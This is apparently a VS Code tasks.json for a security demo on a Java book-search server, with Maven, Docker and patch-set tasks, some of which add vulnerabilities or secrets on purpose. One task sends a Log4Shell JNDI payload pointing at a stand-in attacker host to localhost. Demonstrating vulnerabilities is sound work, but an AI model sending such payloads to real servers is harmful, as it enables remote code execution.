{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "verify",
      "type": "shell",
      "command": "mvn -B verify",
      "group": "build"
    },
    {
      "label": "package",
      "type": "shell",
      "command": "mvn -B package",
      "group": "build",
      "problemMatcher": [],
    },
    {
      "label": "test",
      "type": "shell",
      "command": "mvn -B test",
      "group": "test"
    },
    {
      "label": "curl: log4j injection attack",
      "type": "shell",
      "command": "curl localhost:8080/status -H\"X-Api-Version: jndi:ldap://evil.operator/x\"",
      "group": "test"
    },
    {
      "label": "demo: code feature",
      "type": "shell",
      "command": "patches/apply_patch_set_in_branch.sh",
      "args": [
        "${input:CODE_FEATURE}",
        "${input:BRANCH_NAME}",
      ],
      "group": "none",
      "isBackground": true,
      "problemMatcher": [],
      "promptOnClose": false,
      "presentation": {
        "echo": true,
        "reveal": "always",
        "focus": false,
        "panel": "shared",
        "showReuseMessage": false,
        "clear": false
      }
    },
    {
      "label": "security: inject secrets",
      "type": "shell",
      "command": "patches/apply_patch_set.sh",
      "args": [
        "secret-scanning"
      ],
      "group": "none",
      "isBackground": true,
      "problemMatcher": [],
      "promptOnClose": false,
      "presentation": {
        "echo": true,
        "reveal": "always",
        "focus": false,
        "panel": "shared",
        "showReuseMessage": false,
        "clear": false
      }
    },
    {
      "label": "security: update to Jetty 10.0.2",
      "type": "shell",
      "command": "patches/apply_patch_set.sh",
      "args": [
        "jetty-version-10.0.2"
      ],
      "group": "none",
      "isBackground": true,
      "problemMatcher": [],
      "promptOnClose": false,
      "presentation": {
        "echo": true,
        "reveal": "always",
        "focus": false,
        "panel": "shared",
        "showReuseMessage": false,
        "clear": false
      }
    },
    {
      "label": "security: update to Jetty 10.0.6",
      "type": "shell",
      "command": "patches/apply_patch_set.sh",
      "args": [
        "jetty-version-10.0.6"
      ],
      "group": "none",
      "isBackground": true,
      "problemMatcher": [],
      "promptOnClose": false,
      "presentation": {
        "echo": true,
        "reveal": "always",
        "focus": false,
        "panel": "shared",
        "showReuseMessage": false,
        "clear": false
      }
    },
    {
      "label": "security: fix search SQL vulnerability",
      "type": "shell",
      "command": "patches/apply_patch_set.sh",
      "args": [
        "book-search-bug-fix"
      ],
      "group": "none",
      "isBackground": true,
      "problemMatcher": [],
      "promptOnClose": false,
      "presentation": {
        "echo": true,
        "reveal": "always",
        "focus": false,
        "panel": "shared",
        "showReuseMessage": false,
        "clear": false
      }
    },
    {
      "label": "security: log4j vulnerability",
      "type": "shell",
      "command": "patches/apply_patch_set.sh",
      "args": [
        "log4j-vulnerability"
      ],
      "group": "none",
      "isBackground": true,
      "problemMatcher": [],
      "promptOnClose": false,
      "presentation": {
        "echo": true,
        "reveal": "always",
        "focus": false,
        "panel": "shared",
        "showReuseMessage": false,
        "clear": false
      }
    },
    {
      "label": "demo: patch set",
      "type": "shell",
      "command": "patches/apply_patch_set.sh",
      "args": [
        "${input:PATCH_SET}"
      ],
      "group": "none",
      "isBackground": true,
      "problemMatcher": [],
      "promptOnClose": false,
      "presentation": {
        "echo": true,
        "reveal": "always",
        "focus": false,
        "panel": "shared",
        "showReuseMessage": false,
        "clear": false
      }
    },
    {
      "label": "docker: build container",
      "type": "shell",
      "command": "docker",
      "args": [
        "build",
        ".",
        "--build-arg",
        "VERSION=${input:MAVEN_PROJECT_VERSION}",
        "--tag",
        "demo-server:latest"
      ],
      "dependsOn": [
        "package"
      ],
      "group": "none",
      "isBackground": false,
      "problemMatcher": [],
      "promptOnClose": false,
      "presentation": {
        "echo": true,
        "reveal": "always",
        "focus": true,
        "panel": "new",
        "showReuseMessage": false,
        "clear": false
      }
    },
    {
      "label": "docker: run container",
      "type": "shell",
      "command": "docker",
      "args": [
        "run",
        "-it",
        "-p${input:SERVER_PORT}:${input:SERVER_PORT}",
        "-eSERVER_PORT=${input:SERVER_PORT}",
        "--rm",
        "--name",
        "demo-server",
        "demo-server:latest"
      ],
      "group": "none",
      "isBackground": false,
      "problemMatcher": [],
      "promptOnClose": false,
      "presentation": {
        "echo": true,
        "reveal": "always",
        "focus": true,
        "panel": "new",
        "showReuseMessage": false,
        "clear": true
      }
    }
  ],
  "inputs": [
    {
      "id": "MAVEN_PROJECT_VERSION",
      "type": "promptString",
      "default": "1.0.0-SNAPSHOT",
      "description": "Project version number"
    },
    {
      "id": "SERVER_PORT",
      "type": "promptString",
      "default": "8080",
      "description": "Demo server port"
    },
    {
      "id": "CODE_FEATURE",
      "type": "pickString",
      "description": "Select the desired feature patch set",
      "default": "book-search",
      "options": [
        "book-star-rating",
        "book-search"
      ]
    },
    {
      "id": "PATCH_SET",
      "type": "pickString",
      "description": "Select the desired patch set",
      "default": "book-search-bug-fix",
      "options": [
        "book-search-bug-fix",
        "jetty-version-10.0.2",
        "jetty-version-10.0.6",
        "log4j-vulnerability",
        "secret-scanning"
      ]
    },
    {
      "id": "BRANCH_NAME",
      "type": "promptString",
      "default": "",
      "description": "Provide a feature branch name or leave blank to use default"
    }
  ]
}